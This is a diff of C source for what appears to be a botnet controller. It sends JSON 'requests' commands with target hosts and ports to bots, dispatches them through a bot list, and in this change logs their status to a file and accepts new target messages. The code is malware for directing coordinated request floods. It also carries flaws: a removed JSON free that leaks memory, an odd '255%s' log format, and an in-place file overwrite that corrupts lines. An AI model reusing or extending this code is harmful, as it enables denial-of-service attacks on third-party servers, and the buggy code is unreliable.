@@ -202,7 +202,8 @@ int send_request(char *host, char *port, char *targetHost, char *targetPort, int
     if (curl) {
         char url[100];
         snprintf(url, sizeof(url), "http://%s:%s", host, port);
-
+        char status[100];
+        snprintf(status, sizeof(status), "sending requests to %s and port %s", targetHost, targetPort);
         struct json_object *request_json = json_object_new_object();
         json_object_object_add(request_json, "command", json_object_new_string("requests"));
         json_object_object_add(request_json, "host", json_object_new_string(targetHost));
@@ -217,18 +218,46 @@ int send_request(char *host, char *port, char *targetHost, char *targetPort, int
         res = curl_easy_perform(curl);
 
         if (res == CURLE_OK) {
-            // Handle the response here, e.g., write to a log file
-//            FILE *log_file = fopen("requests.log", "a");
-//            if (log_file) {
-//                time_t current_time = time(NULL);
-//                char timestamp[64];
-//                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&current_time));
-//                fprintf(log_file, "timestamp: %s | bot %s on port %s start send request to %s on port %s\n", timestamp, host, port, targetHost, targetPort);
-//                fclose(log_file);
-//            } else {
-//                printf("Failed to open log file\n");
-//                return 1;
-//            }
+            FILE *file = fopen("status.log", "a+"); // Apri il file in modalità append/lettura
+
+            if (file == NULL) {
+                perror("Errore nell'apertura del file");
+                return 1;
+            }
+
+            // Calcola il timestamp
+            time_t t = time(NULL);
+            struct tm *tm_info = localtime(&t);
+            char timestamp[20];
+            strftime(timestamp, 20, "%Y%m%d-%H%M", tm_info);
+
+            char line[200]; // Supponiamo che ogni riga del file abbia meno di 100 caratteri
+
+            // Crea la riga con il formato richiesto
+            snprintf(line, sizeof(line), "%d|%s|%s|255%s|%s\n", index, host, port, status, timestamp);
+
+            // Cerca se esiste già una riga con lo stesso indice
+            char temp[100];
+            char *found = NULL;
+
+            while (fgets(temp, sizeof(temp), file)) {
+                int current_index;
+                if (sscanf(temp, "%d|", &current_index) == 1 && current_index == index) {
+                    found = temp;
+                    break;
+                }
+            }
+
+            if (found != NULL) {
+                // Sovrascrivi la riga con le nuove informazioni
+                fseek(file, -(long)strlen(found), SEEK_CUR);
+                fputs(line, file);
+            } else {
+                // Scrivi una nuova riga
+                fputs(line, file);
+            }
+
+            fclose(file);
         } else {
             printf("Error in the request: %s\n", curl_easy_strerror(res));
             return 1;
@@ -328,6 +357,9 @@ void handle_post_request(int client_socket, const char *data) {
 
     struct json_object *clientIP_obj;
     struct json_object *ports_obj;
+    struct json_object *targetIp_obj;
+    struct json_object *targetPort_obj;
+    struct json_object *clientPort_obj;
 
     if (json_object_object_get_ex(json_obj, "clientIP", &clientIP_obj) &&
         json_object_object_get_ex(json_obj, "ports", &ports_obj)) {
@@ -382,10 +414,19 @@ void handle_post_request(int client_socket, const char *data) {
 
         // Invia una risposta di successo al client
         send_response(client_socket, 200, "OK", added_count > 0 ? "Data added successfully" : "No new data added");
+    } else if (json_object_object_get_ex(json_obj, "targetIP", &targetIp_obj) &&
+               json_object_object_get_ex(json_obj, "targetPort", &targetPort_obj) &&
+               json_object_object_get_ex(json_obj, "clientIP", &clientIP_obj) &&
+               json_object_object_get_ex(json_obj, "port", &clientPort_obj)) {
+        const char *targetIp = json_object_get_string(targetIp_obj);
+        const char *targetPort = json_object_get_string(targetPort_obj);
+        const char *clientIp = json_object_get_string(clientIP_obj);
+        const char *clientPort = json_object_get_string(clientPort_obj);
+
+        send_response(client_socket, 200, "OK", "Message received");
     } else {
         send_response(client_socket, 400, "Bad Request", "Invalid JSON format");
     }
-    json_object_put(json_obj);
 }
 
 // Funzione per inviare una risposta HTTP al client
@@ -714,7 +755,7 @@ int send_requests_through_bots(char *targetHost, char *targetPort, int index) {
         return 1;
     }
 
-    char line[100];
+    char line[1024];
     int current_index = 0;
     int result;
     while (fgets(line, sizeof(line), file)) {
